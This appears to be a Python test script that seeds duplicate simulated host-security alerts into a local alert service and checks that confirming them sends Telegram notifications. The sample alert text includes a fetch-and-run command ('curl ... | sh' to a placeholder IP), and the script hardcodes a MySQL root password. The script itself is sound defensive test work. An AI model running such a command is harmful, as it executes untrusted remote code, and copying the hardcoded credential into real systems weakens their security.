#!/usr/bin/env python3
"""测试数据写入脚本。

用途：向 ANQS 写入多条内容相同的告警，用于验证「点击确认 -> Telegram 群通知」链路。

用法：
    ./seed-test-alerts.py [条数] [起始序号]

    ./seed-test-alerts.py 20        # 写入 20 条，序号自动递增
    ./seed-test-alerts.py 20 100    # 写入 20 条，序号从 100 开始
    ./seed-test-alerts.py --confirm  # 写入后自动逐条确认，验证 Telegram 推送

依赖：后端已启动在 127.0.0.1:30044，且 config/config.yml 已启用 telegram。
"""

import json
import os
import subprocess
import sys
import urllib.request

API_BASE = os.environ.get("API_BASE", "http://127.0.0.1:30044/v1")
FINGERPRINT_PREFIX = "screenshot-duplicate:alert:"

MESSAGE = """❌❌❌❌AQS❌❌❌❌
☁ 告警来源：企业版
🌐 内网IP：19.56.24.8
🖥 实例名称：aws-hk-zf-prod-yihuan-008
📑 告警名称：[本地模拟] 重复主机告警关联验证
🚨 告警等级：中危
⏱ 首次发生时间：2026-11-21 17:30:00
⏱ 最新发生时间：2026-11-21 17:30:00
💻 命令行：/bin/sh -c "curl -s http://192.0.2.10/x.sh | sh"
🔐 恶意文件MD5：d41d8cd98f00b204e9800998ecf8427e
🛠 处置建议：请人工核实该主机是否存在异常行为"""

PAYLOAD = {
    "InstanceName": "aws-hk-zf-prod-yihuan-008",
    "IntranetIp": "19.56.24.8",
    "Level": "medium",
}

# 本机存在 HTTP 代理时，请求 127.0.0.1 会被代理拦截，显式绕过。
OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def request(method, path, payload=None):
    """发起一次 JSON 请求，返回 (code, body_dict)。"""
    data = None if payload is None else json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        API_BASE + path,
        data=data,
        method=method,
        headers={"Content-Type": "application/json"},
    )
    try:
        with OPENER.open(req, timeout=30) as resp:
            return resp.status, json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as exc:
        return exc.code, {"raw": exc.read().decode("utf-8", "replace")}
    except Exception as exc:  # noqa: BLE001 - 测试脚本需要打印所有失败原因
        return 0, {"error": str(exc)}


def current_max_seq():
    """取已写入的最大序号，保证多次执行不冲突。"""
    sql = (
        "SELECT COALESCE(MAX(CAST(SUBSTRING_INDEX(fingerprint,':',-1) AS UNSIGNED)),0) "
        "FROM security_alerts WHERE fingerprint LIKE '%s%%';"
    ) % FINGERPRINT_PREFIX
    try:
        out = subprocess.run(
            ["docker", "exec", "anqs-mysql", "mysql", "-uroot", "-p1qaz@WSX",
             "-N", "-B", "-D", "xops_aegis_guard", "-e", sql],
            capture_output=True, text=True, timeout=30,
        )
        return int(out.stdout.strip() or 0)
    except Exception:  # noqa: BLE001
        return 0


def build_alert(seq):
    return {
        "source": "local-test",
        "product_type": "AQS",
        "alert_type": "local-test",
        "provider_alert_id": f"screenshot-duplicate-{seq}",
        "fingerprint": f"{FINGERPRINT_PREFIX}{seq}",
        "title": "[本地模拟] 重复主机告警关联验证",
        "severity": "medium",
        "status": "firing",
        "device_id": 8,
        "last_payload": json.dumps(PAYLOAD, ensure_ascii=False),
        "last_message": MESSAGE,
    }


def main():
    args = [a for a in sys.argv[1:] if a != "--confirm"]
    auto_confirm = "--confirm" in sys.argv[1:]
    count = int(args[0]) if len(args) > 0 else 10
    start = int(args[1]) if len(args) > 1 else current_max_seq() + 1

    created_ids = []
    print(f"写入 {count} 条测试告警，序号 {start} .. {start + count - 1}")
    for seq in range(start, start + count):
        status, body = request("POST", "/alert", build_alert(seq))
        if status == 200 and body.get("code") == 200:
            # 新建接口返回的是完整 model，ID 嵌在 TimeModel 里。
            data = body.get("data") or {}
            alert_id = (data.get("TimeModel") or {}).get("id") or data.get("id")
            created_ids.append(alert_id)
            print(f"  [OK]   id={alert_id} fingerprint={FINGERPRINT_PREFIX}{seq}")
        else:
            print(f"  [FAIL] seq={seq} status={status} body={str(body)[:160]}")

    print(f"\n写入完成：成功 {len(created_ids)} 条")

    if auto_confirm and created_ids:
        print("\n逐条确认（验证 Telegram 推送）：")
        ok = 0
        for alert_id in created_ids:
            status, body = request(
                "POST", "/alert-confirm",
                {"id": alert_id, "note": f"测试确认：验证点击确认后告警推送到 Telegram 群 #{alert_id}"},
            )
            data = body.get("data") or {}
            sent = data.get("notification_sent")
            err = data.get("notification_error") or "-"
            if status == 200 and sent:
                ok += 1
                print(f"  [OK]   id={alert_id} sent=True")
            else:
                print(f"  [FAIL] id={alert_id} status={status} sent={sent} err={err}")
        print(f"确认完成：成功推送 {ok}/{len(created_ids)} 条")

    status, body = request("GET", "/alertstats")
    print(f"\n当前统计：{json.dumps(body.get('data', body), ensure_ascii=False)}")


if __name__ == "__main__":
    main()
